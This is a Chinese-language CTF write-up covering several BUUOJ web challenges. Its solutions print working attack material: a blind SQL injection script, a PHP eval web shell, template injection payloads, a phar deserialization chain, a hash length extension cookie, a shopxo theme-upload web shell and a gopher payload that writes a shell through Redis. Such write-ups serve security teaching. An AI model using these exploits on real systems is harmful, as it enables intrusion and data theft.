<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=&quot;./&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image/jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>不应该过<code>\\0</code>,传入<code>\0</code>,加反斜线变成<code>\\\0</code>，过之后变成<code>\</code>，可以逃逸。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image.php?id=\0&amp;path=+or+id=3+order+by+2%23 # 成功</span><br><span class="line">image.php?id=\0&amp;path=+or+id=3+order+by+3%23 # 失败</span><br></pre></td></tr></table></figure>

<p>盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b74c9739-071c-4a0f-9c97-f7eff3e4438e.node3.buuoj.cn/image.php&quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(0, 30):</span><br><span class="line">    right = 127</span><br><span class="line">    left = 32</span><br><span class="line">    mid = int((right + left) &gt;&gt; 1)</span><br><span class="line">    while right &gt; left:</span><br><span class="line">        payload = &quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line">        # select group_concat(column_name) from information_schema.columns where table_schema=database()</span><br><span class="line">        #</span><br><span class="line">        params = &#123;</span><br><span class="line">            &#x27;id&#x27;: &#x27;\\0&#x27;,</span><br><span class="line">            &#x27;path&#x27;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.get(url, params=params)</span><br><span class="line"></span><br><span class="line">        if &quot;JFIF&quot; in response.text:</span><br><span class="line">            left = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = int((right + left) &gt;&gt; 1)</span><br><span class="line"></span><br><span class="line">    result += chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>回显位置，发现是 php，有上传的文件名。再次上传文件名为 php 木马的文件，连接日志文件获得 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logs/upload.1de80834766269f33c963dd093dee010.log.php</span><br></pre></td></tr></table></figure>

<p>文件名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;c&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h4><p>Smarty 模板注入，可以使用一些 php 语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;readfile(&#x27;/flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h4><p>走一遍正常流程，注册登录，上传只能传图，下载的地方抓一下包，filename这里有路径穿越，读了index, upload, download, class, delete, login，开始审计。</p>
<p>upload里面会检查文件类型，然后把后缀名改成图片的类型，默认是gif。</p>
<p>download限制了文件名长度，其中不能含有flag。</p>
<p>重点是class.php，其中有3个类，FIle, Filelist, User</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class File &#123;</span><br><span class="line">	public $filename;</span><br><span class="line">	public function close() &#123;</span><br><span class="line">		return file_get_contents($this-&gt;filename);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FIle类中的<code>close()</code>有<code>file_get_contents()</code>可以用来获取flag，但是没有输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">	public $db;</span><br><span class="line">	public function __destruct() &#123;</span><br><span class="line">		$this-&gt;db-&gt;close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User类中有<code>__destruct()</code>，在User类销毁的时候可以调用db的close方法，如果db是一个File类的实例，就能调用FIle的close读取flag，但还是不能输出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class FileList &#123;</span><br><span class="line">	private $files;</span><br><span class="line">	private $results;</span><br><span class="line">	private $funcs;</span><br><span class="line">	public function __call($func, $args) &#123;</span><br><span class="line">		array_push($this-&gt;func, $func);</span><br><span class="line">		foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">			$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __destruct() &#123;</span><br><span class="line">	$table = &#x27;html...&#x27;;</span><br><span class="line">	$table .= &#x27;html...&#x27;;</span><br><span class="line">	foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">		$table .= &#x27;html...&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	$table .= &#x27;html...&#x27;</span><br><span class="line">	foreach ($this-&gt;results as $filename =&gt; $result) &#123;</span><br><span class="line">		$table .=&#x27;html..&#x27;;</span><br><span class="line">		foreach ($result as $func =&gt; $value) &#123;</span><br><span class="line">			$table .= &#x27;..&#x27;.htmlentities($value).&#x27;..&#x27;;</span><br><span class="line">		&#125;</span><br><span class="line">		$table .= &#x27;...&#x27;.htmlentities($filename).&#x27;..&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo $table;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FileList 类中有<code>__call()</code>，可以调用File的<code>close()</code>，还能存储结果输出出来。</p>
<p>思路：创建一个User类的对象，它的db变量是一个FileList对象，FileList的files变量是包含一个File对象的数组，这个File对象的filename变量是flag的位置。User对象销毁时会调用db的<code>close()</code>，db是一个FIleLIst对象，没有<code>close()</code>的情况下会调用<code>__call()</code>，再调用File（$filename=’/flag.txt’）的<code>close()</code>，返回值存到FileList的$result里，再打印出来。</p>
<p>可以利用phar创建符合以上要求的对象，可以参考博客里的 phar扩展php反序列化攻击面。生成phar：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $file = new File();</span><br><span class="line">        $file-&gt;filename = &#x27;/flag.txt&#x27;;</span><br><span class="line">        $this-&gt;files = array($file);</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$o = new User();</span><br><span class="line">$o-&gt;db = new FileList();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(&quot;jwt.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>很多文件系统函数可以触发phar的反序列化，这个网站有上传、下载和删除操作，都看一遍，上传和下载都没什么，删除的地方有个unlink，正好可以利用，把生成的phar后缀名改成jpg，上传，在删除的地方抓包，可以得到flag。</p>
<h4 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<p>分为3个路由，geneSgn生成<code>&#39;scan&#39; + param</code>的md5。index给你看一下源代码。challenge接受action，param，sign三个参数，param过一下waf（不能以<code>gopher</code>或者<code>file</code>开头），进入Exec，首先检查<code>secret_key + param + action</code>的md5与 sing 是否一致，然后判断 scan 和 read 是否在action中。如果含有scan则把param文件写入tmpfile，含有read返回tmpfile的内容。</p>
<p>解法一：哈希长度扩展攻击</p>
<p>secret_key长度16，<code>geneSign?param=flag.txt</code> 可以得到 <code>md5(secret_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code>，目的是获取<code>md5(secret_key + &#39;flag.txt&#39; + action)</code>其中action含有read。可以使用哈希长度扩展攻击。</p>
<p>得到action 为 <code>scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%0 0%00%00%00%00%00read</code>时的md5<code>9b02232286ed9dd4f7e52eba63094180</code>，发包即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://63904195-027d-4866-a049-78fd37f2a920.node3.buuoj.cn/De1ta?param=flag.txt&#x27;</span><br><span class="line">cookies = &#123;</span><br><span class="line">  &#x27;sign&#x27;: &#x27;9b02232286ed9dd4f7e52eba63094180&#x27;,</span><br><span class="line">  &#x27;action&#x27;: &#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>解法二：字符串拼接</p>
<p>问题在于geneSign处，返回的md5是<code>scret_key + flag.txt + scan</code>，即<code>&lt;secret_key&gt;flag.txtscan</code>，所以直接访问<code>/geneSign?param=flag.txtread</code>得到的md5就是<code>&lt;secret_key&gt;flag.txtreadscan</code>的MD5，用这个MD5作为sign访问<code>/De1ta?param=flag.txt</code>，action为readscan，直接可以得到flag。</p>
<p><code>urllib.urlopen()</code>可以用<code>file://</code>包含文件，这里过滤了，可以使用<code>local_file:</code>代替。</p>
<h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>hint.txt里面告诉了filehash的生成方式，需要我们找到cookie_secret。</p>
<p>welcome.txt 写了render，flag.txt里给了flag的路径。</p>
<p><code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag</code>，提示Error，同时url变成<code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg=Error</code>，结合上面的render可以想到模板注入获得cookie_secret。</p>
<p><code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/error?msg=&#123;&#123;handler.application.settings&#125;&#125;</code>，得到cookiesecet，<code>e85fca1a-db5a-4d80-82aa-53d3a3d1637a </code>，MD5一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">cs = &#x27;e85fca1a-db5a-4d80-82aa-53d3a3d1637a&#x27;</span><br><span class="line">fn = /fllllllllllllag</span><br><span class="line">def md5(s):</span><br><span class="line">	md5 = hashlib.md5</span><br><span class="line">	md5.update(s.encode())</span><br><span class="line">	return md5.hexdigest()</span><br><span class="line">print(md5(cs+md5(fn)))</span><br></pre></td></tr></table></figure>

<p><code>http://3d7b4f67-c482-4541-ba68-e1cf1b467deb.node3.buuoj.cn/file ?filename=/fllllllllllllag &amp;filehash=a7982b91f8645e9107b05b0721a6fceb</code></p>
<h4 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h4><p>含有提示 cve-2020-7066，查一下，getheaders函数存在00截断，tips 要求结尾是123</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:%2f%2f127.0.0.123%00www.ctfhub.com</span><br></pre></td></tr></table></figure>

<h4 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h4><p><a target="_blank" rel="noopener" href="https://www.nctry.com/1660.html">shopxo后台全版本获取shell复现</a></p>
<p>访问后台<code>/admin.php?s=/admin/logininfo.html</code>，使用<code>admin:shopxo</code>登录</p>
<p>找到 应用中心 应用商店 主题，下载粉红主题，在主题的 <code>default/_static_/</code>目录下添加木马，重新压缩</p>
<p>到 网站管理 主题管理 主题安装，上传压缩后的主题，l连接木马路径<code>/public/static/index/lengyu/shell.php</code></p>
<p>根目录下的 flag 文件提示 flag 在 root 下，但无权限。根目录有 auto.sh，定时运行 makeflag，找到该文件，改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&quot;cat /root/flag&gt;/1.txt&quot;)</span><br></pre></td></tr></table></figure>

<p>等待一分钟，得到 flag</p>
<h4 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h4><p>访问 secret ，除了 127.0.0.1 以外还有两个 IP 地址，173.183.118.10/24 和 172.18.0.13/12，应该是一个 SSRF，扫描一下 173.183.118.10/24 子网里的其他主机，</p>
<p>过滤了 <code>file://</code>和<code>dict://</code>协议，使用 HTTP 探测</p>
<p>使用 intruder 爆破，在 173.183.118.12 的响应中看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被你发现了,但你也许需要试试其他服♂务,就在这台机子上! ...我说的是端口啦1</span><br></pre></td></tr></table></figure>

<p>爆破这台机器的端口，在 6379 端口看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-ERR wrong number of arguments for &#x27;get&#x27; command</span><br></pre></td></tr></table></figure>

<p>存在 redis 服务</p>
<p>使用 gopher 协议利用未授权访问写入 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">protocol = r&quot;gopher://&quot;</span><br><span class="line">ip = &quot;173.183.118.12&quot;</span><br><span class="line">port = &quot;6379&quot;</span><br><span class="line">shell = &quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span><br><span class="line">filename = &quot;shell.php&quot;</span><br><span class="line">path = &quot;/var/www/html&quot;</span><br><span class="line">passwd = &quot;&quot;</span><br><span class="line">cmd = [&quot;flushall&quot;,</span><br><span class="line">       &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;, &quot;$&#123;IFS&#125;&quot;)),</span><br><span class="line">       &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line">       &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line">       &quot;save&quot;</span><br><span class="line">       ]</span><br><span class="line">if passwd:</span><br><span class="line">    cmd.insert(0, &quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class="line">payload = protocol+ip+&quot;:&quot;+port+&quot;/_&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF = &quot;\r\n&quot;</span><br><span class="line">    redis_arr = arr.split(&quot; &quot;)</span><br><span class="line">    cmd = &quot;&quot;</span><br><span class="line">    cmd += &quot;*&quot;+str(len(redis_arr))</span><br><span class="line">    for x in redis_arr:</span><br><span class="line">        cmd += CRLF+&quot;$&quot; + \</span><br><span class="line">            str(len((x.replace(&quot;$&#123;IFS&#125;&quot;, &quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;, &quot; &quot;)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    return cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for x in cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    print payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>生成 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://173.183.118.12:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>

<p>在 url 中访问 <code>http://173.183.118.12/shell.php</code></p>
